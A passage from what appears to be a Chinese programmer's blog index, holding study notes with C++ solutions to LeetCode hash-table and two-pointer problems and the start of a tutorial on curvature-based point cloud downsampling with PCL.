head;</span><br><span class="line">                <span class="keyword">while</span> (index1 != index2) &#123;</span><br><span class="line">                    index1 = index1-&gt;next;</span><br><span class="line">                    index2 = index2-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> index2; <span class="comment">// 返回环的入口</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>













]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>哈希表</title>
    <url>/2023/09/18/%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><p><strong>哈希表：</strong>根据关键码的值而直接进行访问的数据结构。</p>
<p>一般的哈希表都是用来快速判断一个元素是否出现在集合里</p>
<p>常见哈希结构：详细见<a href="https://programmercarl.com/%E5%93%88%E5%B8%8C%E8%A1%A8%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%89%E7%A7%8D%E5%93%88%E5%B8%8C%E7%BB%93%E6%9E%84">代码随想录 (programmercarl.com)</a></p>
<p><img src="/2023/09/18/%E5%93%88%E5%B8%8C%E8%A1%A8/image-20230918104630195.png" alt="image-20230918104630195"></p>
<h1 id="2-leetcode-242-有效的字母异位词"><a href="#2-leetcode-242-有效的字母异位词" class="headerlink" title="2.leetcode-242-有效的字母异位词"></a>2.leetcode-242-有效的字母异位词</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/valid-anagram/">242. 有效的字母异位词 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>利用一个哈希表对s中字符进行存储，然后对t中字符进行删减 若最后哈希表中存在小于0或大于1的值则返回false。</li>
<li>其实可以用普通数组 因为字母26个元素数量比较少，用数组就可以实现。</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="function">unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(s.size())</span></span>;<span class="comment">//哈希表</span></span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">size</span>() != t.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            cnt[s[i]]++;<span class="comment">//存储s中的字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; t.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            cnt[t[i]]--;<span class="comment">//减去t中的字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;[key, val] : cnt) &#123;</span><br><span class="line">            <span class="keyword">if</span>(val &gt; <span class="number">0</span> || val &lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n)遍历字符串</li>
<li>空间复杂度：O(n)哈希表</li>
</ul>
<h1 id="3-leetcode-349-两个数组的交集"><a href="#3-leetcode-349-两个数组的交集" class="headerlink" title="3.leetcode-349-两个数组的交集"></a>3.leetcode-349-两个数组的交集</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/intersection-of-two-arrays/description/">349. 两个数组的交集 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li><p>因为<code>nums.size()∈[0, 1000]</code>，所以直接使用数组，并且<code>res</code>返回值必须是唯一的，所新建访问数组，判断是否已经添加到<code>res</code>中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">intersection</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">visited</span><span class="params">(<span class="number">1000</span>, <span class="number">0</span>)</span></span>;<span class="comment">//访问数组</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">1000</span>, <span class="number">0</span>)</span></span>;<span class="comment">//计数数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : nums1) &#123;</span><br><span class="line">            cnt[x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[x] &gt;= <span class="number">1</span> &amp;&amp; visited[x] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//判断是否存在在nums2中，并且还未访问过</span></span><br><span class="line">                res.<span class="built_in">push_back</span>(x);</span><br><span class="line">                visited[x] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>复杂度分析：</p>
<ul>
<li><input disabled type="checkbox"> 时间复杂度：O(m+n)两次数组循环</li>
<li><input disabled type="checkbox"> 空间复杂度：O(n)数组创建</li>
</ul>
</li>
<li><p>正常解法：如果<strong>没有传入数组大小的限制</strong>，则用<code>unordered_set</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">intersection</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; result_set; <span class="comment">// 存放结果，之所以用set是为了给结果集 去重！！！</span></span><br><span class="line">        <span class="function">unordered_set&lt;<span class="type">int</span>&gt; <span class="title">nums_set</span><span class="params">(nums1.begin(), nums1.end())</span></span>;<span class="comment">//传入nums1的元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums2) &#123;</span><br><span class="line">            <span class="comment">// 发现nums2的元素 在nums_set里又出现过</span></span><br><span class="line">            <span class="keyword">if</span> (nums_set.<span class="built_in">find</span>(num) != nums_set.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="comment">//find迭代器查找，若找到元素则返回一个指向该元素的迭代器</span></span><br><span class="line">                <span class="comment">//若不存在 则返回nums_Set.end()</span></span><br><span class="line">                result_set.<span class="built_in">insert</span>(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(result_set.<span class="built_in">begin</span>(), result_set.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>复杂度分析：</p>
<ul>
<li><p><input disabled type="checkbox"> 
时间复杂度：O(mn)遍历数组并查找元素</p>
</li>
<li><p><input disabled type="checkbox"> 
空间复杂度：O(n)哈希表</p>
</li>
</ul>
</li>
</ul>
<h1 id="4-leetcode-202-快乐数"><a href="#4-leetcode-202-快乐数" class="headerlink" title="4.leetcode-202-快乐数"></a>4.leetcode-202-快乐数</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/happy-number/description/">202. 快乐数 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>题目中表示会无限循环，也就是sum会重复出现</li>
<li>所以需要用哈希表存储sum，如果sum重复出现了就返回false，否则一直查找直到找到sum为1为止。</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getSum</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n) &#123;</span><br><span class="line">            sum += (n % <span class="number">10</span>) * (n % <span class="number">10</span>);<span class="comment">//平方</span></span><br><span class="line">            n /= <span class="number">10</span>;<span class="comment">//迭代</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; set;<span class="comment">//哈希表</span></span><br><span class="line">        <span class="comment">//无限循环</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> sum = <span class="built_in">getSum</span>(n);<span class="comment">//求和函数</span></span><br><span class="line">            <span class="keyword">if</span> (sum == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//如果为1，贼返回true</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (set.<span class="built_in">find</span>(sum) != set.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//如果已经在哈希表钟出现则进入死循环，马上返回false</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                set.<span class="built_in">insert</span>(sum);<span class="comment">//插入哈希表钟</span></span><br><span class="line">            &#125;</span><br><span class="line">            n = sum;<span class="comment">//迭代n的值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(logn)循环遍历</li>
<li>空间复杂度：O(logn)哈希表</li>
</ul>
<h1 id="5-leetcode-1-两数之和"><a href="#5-leetcode-1-两数之和" class="headerlink" title="5.leetcode-1-两数之和"></a>5.leetcode-1-两数之和</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/two-sum/description/">1. 两数之和 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>需要存已经遍历过的元素，和元素的数组下标—–&gt;用map，key（元素）我们要查找的是元素，所以用key存放元素，value存放元素位置。</li>
<li><img src="/2023/09/18/%E5%93%88%E5%B8%8C%E8%A1%A8/image-20230920103120479.png" alt="image-20230920103120479"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; map;<span class="comment">//哈希表</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> temp = target - nums[i];<span class="comment">//差</span></span><br><span class="line">            <span class="keyword">auto</span> it = map.<span class="built_in">find</span>(temp);</span><br><span class="line">            <span class="keyword">if</span> (it != map.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="comment">//找到了元素，则返回下标</span></span><br><span class="line">                <span class="keyword">return</span> &#123; it-&gt;second, i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            map.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>,<span class="type">int</span>&gt;(nums[i], i));<span class="comment">//将元素插入哈希表中</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n)遍历数组</li>
<li>空间复杂度：O(n)哈希表</li>
</ul>
<h1 id="6-leetcode-454-四数相加Ⅱ-M"><a href="#6-leetcode-454-四数相加Ⅱ-M" class="headerlink" title="6.leetcode-454-四数相加Ⅱ-M"></a>6.leetcode-454-四数相加Ⅱ-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/4sum-ii/description/">454. 四数相加 II - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>暴力遍历四个数组<code>O(n^4)</code>。</li>
<li>先遍历<code>AB</code>两个数组，然后去剩下<code>CD</code>数组搜索<code>a+b</code>的哈希表中<code>0-(c+d)</code>有无出现。、</li>
<li><img src="/2023/09/18/%E5%93%88%E5%B8%8C%E8%A1%A8/image-20230921103123646.png" alt="image-20230921103123646"></li>
</ul>
<p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fourSumCount</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2, vector&lt;<span class="type">int</span>&gt;&amp; nums3, vector&lt;<span class="type">int</span>&gt;&amp; nums4)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;cnt;</span><br><span class="line">        <span class="comment">//遍历ab数组，并存入哈希表</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> a : nums1) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> b : nums2) &#123;</span><br><span class="line">                cnt[a + b]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历cd数组，并在哈希表中查找</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c : nums3) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> d :nums4) &#123;</span><br><span class="line">                <span class="type">int</span> target = <span class="number">0</span> - (c + d);</span><br><span class="line">                <span class="keyword">if</span> (cnt.<span class="built_in">find</span>(target) != cnt.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                    res += cnt[target];<span class="comment">//注意加的值是哈希表统计的出现次数</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n^2) 遍历循环</li>
<li>空间复杂度：O(n^2)最坏的情况下，ab的值各不相同，相加产生的数字个数为n*n</li>
</ul>
<h1 id="7-leetcode-383-赎金信-E"><a href="#7-leetcode-383-赎金信-E" class="headerlink" title="7.leetcode-383-赎金信-E"></a>7.leetcode-383-赎金信-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/ransom-note/">383. 赎金信 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>用一个<code>map</code>统计<code>ransomNote</code>中出现字母的次数，然后遍历<code>magazine</code>，对<code>map</code>进行减减操作</li>
<li>我这用了两个，其实用一个就行</li>
<li>也可以用数组去实现，因为26个字母数量比较少，用数组则空间复杂度会少很多</li>
</ul>
<p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canConstruct</span><span class="params">(string ransomNote, string magazine)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//可以用一个哈希表实现，第一次+=，第二次-=</span></span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; ranmap, magamap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : ransomNote)&#123;</span><br><span class="line">            ranmap[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : magazine)&#123;</span><br><span class="line">            magamap[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : ransomNote)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ranmap[c] &gt; magamap[c])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n) 遍历数组</li>
<li>空间复杂度：O(n) 哈希表</li>
</ul>
<h1 id="8-leetcode-15-三数之和-M"><a href="#8-leetcode-15-三数之和-M" class="headerlink" title="8.leetcode-15-三数之和-M"></a>8.leetcode-15-三数之和-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/3sum/description/">15. 三数之和 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>用哈希表，因为要<strong>去重</strong>容易超时，这题可以用双指针</li>
<li>对数组进行排序，<code>a+b+c=0</code>，<code>a可</code>以设置成<code>i</code>，<code>b</code>对应<code>left</code>，<code>c</code>对应<code>right</code>。</li>
<li>若之和大于<code>0</code>，<code>right--</code></li>
<li>若小于<code>0</code>，<code>left++</code>；</li>
<li>注意去重。不要判断结果集里两个元素是否相等例如（<code>nums[i] == nums[i+1]</code>），可以写成判断<code>nums[i] == nums[i-1]</code>需要判断<code>i&gt;0</code></li>
<li><img src="/2023/09/18/%E5%93%88%E5%B8%8C%E8%A1%A8/image-20230921144953122.png" alt="image-20230921144953122"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//注意判断条件</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) <span class="keyword">continue</span>;<span class="comment">//对a去重！！！</span></span><br><span class="line">            <span class="type">int</span> left = i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> right = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] + nums[left] + nums[right] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    left = left + <span class="number">1</span>;<span class="comment">//left右移变大</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] + nums[left] + nums[right] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    right = right - <span class="number">1</span>;<span class="comment">//right 变小</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(&#123;nums[i], nums[left], nums[right]&#125;);</span><br><span class="line">                    <span class="comment">//对b，c去重</span></span><br><span class="line">                    <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line">                    <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">					<span class="comment">//找到答案时双指针同时收缩</span></span><br><span class="line">                    left++;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="9-leetcode-18-四数之和-M"><a href="#9-leetcode-18-四数之和-M" class="headerlink" title="9.leetcode-18-四数之和-M"></a>9.leetcode-18-四数之和-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/4sum/description/">18. 四数之和 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>重难点还是去重！！！</li>
<li><code>k</code>、<code>i</code>、<code>left</code>、<code>right</code>，在三数之和的基础上了 套了一层<code>k</code>的<code>for循环</code>。</li>
<li><code>nums[k] + nums[i] + nums[left] + nums[right] == target</code></li>
<li>不能用<code>nums[k] &gt; target</code> 来判断，移位存在负数，两个负数相加反而更小，则不能做剪枝，需要判断<code>nums[k] &gt; 0</code>和 <code>target &gt; 0</code> 才能剪枝</li>
<li><code>nums[k] = nums[k - 1]</code>去重</li>
<li><code>nums[i]</code> 剪枝操作 和 去重操作。</li>
<li>剪枝 <code>nums[i] + nums[k]</code>作为一个整体判断，进行二级剪枝</li>
<li><code>i &gt; k + 1</code>，<code>nums[i] == nums[i - 1]</code>二级去重</li>
<li><img src="/2023/09/18/%E5%93%88%E5%B8%8C%E8%A1%A8/image-20230922105129002.png" alt="image-20230922105129002"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">fourSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="comment">//一级</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; nums.<span class="built_in">size</span>(); k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[k] &gt; target &amp;&amp; nums[k] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//剪枝 直接跳过</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k &gt; <span class="number">0</span> &amp;&amp; nums[k] == nums[k - <span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;<span class="comment">//去重操作</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//二级</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = k + <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[k] + nums[i] &gt; target &amp;&amp; nums[k] + nums[i] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;<span class="comment">//二级剪枝</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; k + <span class="number">1</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;<span class="comment">//二级去重</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> left = i + <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span> (right &gt; left) &#123;</span><br><span class="line">                    <span class="comment">// nums[k] + nums[i] + nums[left] + nums[right] &gt; target 会溢出 所以用long</span></span><br><span class="line">                    <span class="keyword">if</span> ((<span class="type">long</span>) nums[k] + nums[i] + nums[left] + nums[right] &gt; target) &#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    <span class="comment">// 同理</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="type">long</span>) nums[k] + nums[i] + nums[left] + nums[right]  &lt; target) &#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//相等的情况</span></span><br><span class="line">                        res.<span class="built_in">push_back</span>(vector&lt;<span class="type">int</span>&gt;&#123;nums[k], nums[i], nums[left], nums[right]&#125;);</span><br><span class="line">                        <span class="comment">// 对nums[left]和nums[right]去重</span></span><br><span class="line">                        <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">                        <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 找到答案时，双指针同时收缩</span></span><br><span class="line">                        right--;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li><p>时间复杂度：O(n^3)</p>
</li>
<li><p>空间复杂度：O(1) 虽然创建了数组 但是返回值比较少</p>
</li>
</ul>
]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title>点云多尺度滤波</title>
    <url>/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/</url>
    <content><![CDATA[<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p>在降采样中想要充分保留边界信息，但是采用体素降采样，均匀降采样等，都是对<strong>全局</strong>的点云信息进行降采样，无法做到<strong>分区域</strong>的降采样。因此对点云的<code>曲率</code>进行估计，作为额外的补充信息对点云进行降采样。即对点云做<strong>条件滤波</strong>。曲率信息作为滤波条件。</p>
<p><strong>运行环境：</strong><code>Ubuntu18.04</code> + <code>PCL1.11</code></p>
<h1 id="二、实现"><a href="#二、实现" class="headerlink" title="二、实现"></a>二、实现</h1><p><strong>主要步骤如下：</strong></p>
<ol>
<li>估计点云的法向量和曲率</li>
<li>对点云法向量和曲率进行字段连接</li>
<li>根据曲率大小进行分区域降采样</li>
</ol>
<h2 id="2-1估计点云的法向量和曲率"><a href="#2-1估计点云的法向量和曲率" class="headerlink" title="2.1估计点云的法向量和曲率"></a>2.1估计点云的法向量和曲率</h2><p>利用PCL库对点云的法向量和曲率进行估计。要注意根据实际的情况设置合适的点云<code>邻域半径</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pcl::NormalEstimationOMP&lt;pcl::PointXYZ,pcl::Normal&gt;n;</span><br><span class="line">pcl::PointCloud&lt;pcl::Normal&gt;::<span class="function">Ptr <span class="title">normals</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::Normal&gt;)</span></span>;</span><br><span class="line">pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">tree</span><span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">tree-&gt;<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">n.<span class="built_in">setViewPoint</span>(<span class="number">10</span>,<span class="number">10</span>,<span class="number">10</span>);</span><br><span class="line">n.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">n.<span class="built_in">setNumberOfThreads</span>(<span class="number">4</span>);</span><br><span class="line">n.<span class="built_in">setSearchMethod</span>(tree);</span><br><span class="line">n.<span class="built_in">setRadiusSearch</span>(<span class="number">1</span>);<span class="comment">//设置邻域半径</span></span><br><span class="line">n.<span class="built_in">compute</span>(*normals);</span><br></pre></td></tr></table></figure>



